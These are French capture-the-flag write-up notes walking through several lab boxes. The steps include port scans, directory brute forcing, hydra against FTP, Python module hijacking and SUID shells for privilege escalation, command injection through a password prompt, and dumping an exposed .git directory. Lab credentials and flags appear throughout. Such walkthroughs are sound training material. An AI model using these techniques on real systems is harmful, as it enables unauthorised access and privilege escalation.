...
Ports ouverts : 22 (SSH), 80 (HTTP), 8080 (HTTP-proxy)

curl http://10.10.120.246/login/

Commentaire HTML trouvé : <!-- Remember the company policy: color + two digits number -->

curl http://10.10.120.246/api/user/passwordhint/elliot

Résultat : {"hint":"All is not black or white","username":"elliot"}

Analyse de l'indice : "All is not black or white" = couleur grise + 2 chiffres

Création d'un dictionaire avec les variations de gray + 2 chiffres

Test des combinaisons gray/grey + numbs via l'API web.

Credentials trouvés : elliot:Im_M1st3r_R0b0T
...
## Toss a Coin (user.txt et root.txt) :

nmap -sV 10.10.179.5

gobuster dir -u http://10.10.179.5/ -w /usr/share/wordlists/dirb/common.txt

Ports trouvés : 22 (SSH) et 80 (HTTP), répertoires /img et /t

Le site répète "Do you know the lyrics?" partout.

Il faut suivre les paroles "Toss a coin to your witcher" lettre par lettre :

http://10.10.179.5/t/o/s/s/_/a/_/c/o/i/n/_/t/o/_/y/o/u/r/_/w/i/t/c/h/e/r/...

Trouve message "So you DO know the lyrics. Well, good for you!"

Inspecter le code source HTML de cette page finale.

Trouve ligne cachée : jaskier:YouHaveTheMostIncredibleNeckItsLikeASexyGoose
...
Peut exécuter toss-a-coin.py en tant que yen.

echo 'import os; os.system("/bin/bash")' > random.py

sudo -u yen /usr/bin/python3.6 /home/jaskier/toss-a-coin.py

Shell en tant que yen (le script importe notre faux module random).

Le binaire /home/yen/portal (SUID root) exécute "date --date=next hour".
...
Crée un shell SUID appartenant à geralt.

/tmp/rootbash -p

Shell avec euid=geralt.

cd /home/geralt && cat password.txt

Trouve : IH4teP0rt4ls (I Hate Portals)

su geralt

Mot de passe: IH4teP0rt4ls

sudo -l

geralt peut exécuter perl en tant que root.
...
## Secret of the maw (user.txt) :

gobuster dir -u <IP_ADRESSE> -w ../medium.txt

Un port nommé "discrete" est trouvé.

Dans la barre pour remplir un mot de passe, rentrer : echo "head /home/six/user.txt" | sudo -u six /home/six/.musicbox

Ceci s'affiche : ♩♪♪♫♫♬♫♬♬♪♪♬♫♩ You entered head /home/six/user.txt EPI{I_MuS7_F1nD_@_W4y_0Ut} It didn't worked...

Flag : EPI{I_MuS7_F1nD_@_W4y_0Ut}

## Yer a wizard (user.txt) :

nmap -Pn -p- <IP_ADRESSE>

Deux ports sont ouverts, un ftp et un ssh.

hydra -L users.txt -P users.txt ftp://<IP_ADRESSE> -t 4 -vV 

Brut force pour avoir accès au port ftp.

Connection ftp avec le login anonymous et le password anonymous.

Il y a un fichier caché.

get .ReallyHidden

On cat ce fichier, et l'on découvre ceci : FINE! My password is IAlreadySaidTooMuch.

On se connecte au port ssh, avec de mot de passe et le login hagrid.

Nous trouvons un fichier user.txt que l'on cat.

Nous avons ceci :

VWxaQ1NtVjZRblZOTVRseVdWVTFabUpxVGpKTk1VcG1ZVWRHVjAweE9IcGlha0pXVDFWb1prNVVRa1JUZWtvNVEyYzlQUT09

On le convertit en base64.

echo VWxaQ1NtVjZRblZOTVRseVdWVTFabUpxVGpKTk1VcG1ZVWRHVjAweE9IcGlha0pXVDFWb1prNVVRa1JUZWtvNVEyYzlQUT09 | base64 -d

Ce qui donne ça :

UlZCSmV6QnVNMTlyWVU1ZmJqTjJNMUpmYUdGV00xOHpiakJWT1VoZk5UQkRTeko5Q2c9PQ==

On le reconvertit en base64 :

echo UlZCSmV6QnVNMTlyWVU1ZmJqTjJNMUpmYUdGV00xOHpiakJWT1VoZk5UQkRTako5Q2c9PQ== | base64 -d

Nous trouvons cela, puis nous le convertissons une dernière fois en base64 :

echo RVBJezBuM19rYU5fbjN2M1JfaGFWM18zbjBVOUhfNTBDSzJ9Cg== | base64 -d

Ce qui nous donne ce flag :

EPI{0n3_kaN_n3v3R_haV3_3n0U9H_50CK2}

## Grandline (user.txt) :

Nous commencons avec un nmap afin de voir les ports ouverts :

nmap <IP_ADRESSE>

Nous avons un port ssh, un port http et un port blackice_ice.

gobuster dir -u <IP_ADRESSE> -w ../common.txt :

Nous trouvons un port lost.

gobuster dir -u <IP_ADRESSE/lost> -w ../medium.txt :

Nous trouvons un port .git.

Nous faisons cette commande pour récuperer le git:

wget -r -np -R "index.html*" http://<IP>/lost/.git/

On regarde si une clé est laissé dans un commit :

git show

Nous changeons la clé api par celle trouvé, comme ceci :

curl -X POST <IP_ADRESSE>/api/zoro

Nous obtenons un login et un mot de passe. 

{"username":"zoro","password":"1_G07_L0S7_0Nc3_4G41n"}%

Nous nous connectons avec le login zoro et sont mot de passe en ssh.

Puis nous pouvons cat le fichier user.txt :
